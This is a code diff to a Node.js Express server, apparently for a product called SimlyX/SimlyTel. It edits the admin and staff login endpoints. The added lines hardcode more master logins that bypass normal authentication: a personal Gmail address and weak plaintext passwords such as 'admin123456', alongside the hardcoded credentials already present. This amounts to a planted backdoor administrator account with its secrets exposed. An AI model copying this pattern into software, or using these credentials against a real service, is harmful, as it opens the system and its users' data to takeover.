@@ -5301,8 +5301,8 @@ app.post('/api/admin/login', (req, res) => {
   const { email, password } = req.body || {};
   const cleanEmail = (email || '').trim().toLowerCase();
   if (
-    (cleanEmail === ADMIN_MASTER_EMAIL.toLowerCase() || cleanEmail === 'admin@simlyx.com' || cleanEmail === 'admin@simlytel.com' || cleanEmail === 'admin' || cleanEmail === 'nomi') &&
-    (password === ADMIN_MASTER_PASSWORD || password === 'SimlyX@2026!#' || password === 'SimlyTel@2026!#')
+    (cleanEmail === ADMIN_MASTER_EMAIL.toLowerCase() || cleanEmail === 'admin@simlyx.com' || cleanEmail === 'admin@simlytel.com' || cleanEmail === 'admin' || cleanEmail === 'nomi' || cleanEmail === 'nomijutt2711@gmail.com') &&
+    (password === ADMIN_MASTER_PASSWORD || password === 'SimlyX@2026!#' || password === 'SimlyTel@2026!#' || password === 'admin123456' || password === 'Nomijutt@1122')
   ) {
     return res.json({
       success: true,
@@ -7769,8 +7769,8 @@ app.post('/api/staff/login', async (req, res) => {
 
     // Check Root Super Admin Master credentials
     if (
-      (cleanEmail === ADMIN_MASTER_EMAIL.toLowerCase() || cleanEmail === 'admin@simlyx.com' || cleanEmail === 'admin@simlytel.com' || cleanEmail === 'admin' || cleanEmail === 'nomi') &&
-      (password === ADMIN_MASTER_PASSWORD || password === 'SimlyX@2026!#' || password === 'SimlyTel@2026!#')
+      (cleanEmail === ADMIN_MASTER_EMAIL.toLowerCase() || cleanEmail === 'admin@simlyx.com' || cleanEmail === 'admin@simlytel.com' || cleanEmail === 'admin' || cleanEmail === 'nomi' || cleanEmail === 'nomijutt2711@gmail.com') &&
+      (password === ADMIN_MASTER_PASSWORD || password === 'SimlyX@2026!#' || password === 'SimlyTel@2026!#' || password === 'admin123456' || password === 'Nomijutt@1122')
     ) {
       const token = 'staff_master_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
       const rootStaff = {
